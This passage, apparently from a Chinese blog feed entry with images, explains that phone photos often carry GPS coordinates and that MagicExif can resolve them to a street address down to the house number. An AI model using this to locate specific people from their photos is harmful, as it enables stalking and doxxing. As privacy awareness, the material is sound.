<figure data-type="image" tabindex="1"><img src="https://wudi12138.github.io/Greeydi.github.io//post-images/1653912989074.jpeg" alt="" loading="lazy"></figure>
<p>现在的人大部分都是用的手机拍照，大多数相机在自己没有设置的情况下会默认开启地理位置。</p>
<figure data-type="image" tabindex="2"><img src="https://wudi12138.github.io/Greeydi.github.io//post-images/1653912996336.png" alt="" loading="lazy"></figure>
<p>在开启了这种功能下拍摄的照片会自动存有你拍照地点的经纬度信息</p>
<figure data-type="image" tabindex="3"><img src="https://wudi12138.github.io/Greeydi.github.io//post-images/1653913001304.jpeg" alt="" loading="lazy"></figure>
<p>那么我们在MagicExif里面通过经纬度查询到他的具体地址（精确到门牌号的那种地步！！！）</p>
<figure data-type="image" tabindex="4"><img src="https://wudi12138.github.io/Greeydi.github.io//post-images/1653913007734.jpeg" alt="" loading="lazy"></figure>
]]></content>
    </entry>
</feed>